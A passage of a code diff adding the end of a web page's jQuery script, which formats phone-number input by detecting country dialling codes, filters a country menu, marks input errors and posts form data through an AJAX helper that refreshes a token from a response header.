+                selectCountryCode = "";
+                $("#country-input").val("")
+                if ($('#country-wrap>label').hasClass('lable-focus')) {
+                    $('#country-wrap>label').removeClass("lable-focus")
+                }
+            } else {
+                if (selectCountryCode != pregCode){
+                    selectCountryCode = pregCode
+                    $("#country-input").val(countryName)
+                }
+                if (!$('#country-wrap>label').hasClass('lable-focus')) {
+                    $('#country-wrap>label').addClass("lable-focus")
+                }
+            }
+
+            if(pregCode != "") {
+                mobile =  mobile.substring(pregCode.length)
+                mobile = mobileFormate(selectCountryCode,mobile)
+                $('#phone-input').val("+" + selectCountryCode + " " + mobile)
+                oldPhoneInputVal = "+" + selectCountryCode + " " + mobile
+            } else {
+                $('#phone-input').val(pre+mobile)
+                oldPhoneInputVal = pre+mobile
+            }
+
+        }
+
+        function decPhoneInputVal(mobile) {
+
+            var pre = "";
+            if(mobile.substring(0, 1) == "+"){
+                mobile = mobile.substring(1)
+                pre= "+"
+            }
+
+            if (selectCountryCode.length > 0 && selectCountryCode == mobile.substring(0,selectCountryCode.length)) {
+                oldPhoneInputVal = pre + mobile
+            } else {
+
+                var pregCode = "";
+                var countryName = ""
+                for (var i = mobile.substring(0,4).length; i > 0; i--) {
+                    countryName = countryCodeExist(mobile.substring(0,i))
+                    if(countryName != "") {
+                        pregCode = mobile.substring(0,i);
+                        break
+                    }
+                }
+
+                if (pregCode == ""){
+                    selectCountryCode = "";
+                    $("#country-input").val("")
+                    if ($('#country-wrap>label').hasClass('lable-focus')) {
+                        $('#country-wrap>label').removeClass("lable-focus")
+                    }
+                } else {
+                    selectCountryCode = pregCode
+                    $("#country-input").val(countryName)
+                    if (!$('#country-wrap>label').hasClass('lable-focus')) {
+                        $('#country-wrap>label').addClass("lable-focus")
+                    }
+                }
+                oldPhoneInputVal = pre + mobile
+            }
+
+        }
+
+        function showMenu(result){
+
+            if (result == undefined || result == null || result == "" || result.length <= 0) {
+                $(".country-menu-item").show()
+            } else {
+                $(".country-menu-item").hide()
+                for (var i = 0;i <result.length; i++){
+                    $(".cid_"+result[i]+"").show();
+                }
+            }
+        }
+
+        function phoneError() {
+
+            if ($('#phone-wrap>label').hasClass('lable-border-focus')) {
+                $('#phone-wrap>label').removeClass("lable-border-focus")
+            }
+
+            if ($('#phone-input').hasClass('input-focus')) {
+                $('#phone-input').removeClass("input-focus")
+            }
+
+            if (!$('#phone-wrap>label').hasClass('lable-border-focus-error')) {
+                $('#phone-wrap>label').addClass("lable-border-focus-error")
+            }
+
+            if (!$('#phone-input').hasClass('input-focus-error')) {
+                $('#phone-input').addClass("input-focus-error")
+            }
+        }
+
+        function sendRequest(url ,data, fn) {
+            $.ajax({
+                type:"post",
+                url:url,
+                dataType:"json",
+                data:data,
+                success:function(r,status,xhr){
+                    fn(r)
+                    if(r.code != undefined && r.code != '10000'){
+                        if(xhr.getResponseHeader('cfd818aa7ae7edd82123416c6') != undefined && xhr.getResponseHeader('cfd818aa7ae7edd82123416c6') != null && xhr.getResponseHeader('cfd818aa7ae7edd82123416c6') != ''){
+                            $("input[name='cfd818aa7ae7edd82123416c6']").val(xhr.getResponseHeader('cfd818aa7ae7edd82123416c6'))
+                        }
+                    }
+                },
+                error:function(e)
+                {
+                    fn({code:"99999",msg:"Request error"})
+                }
+            });
+        }
+
+        function initForm() {
+
+        }
+
+    })
+</script>
+</body>
+</html>
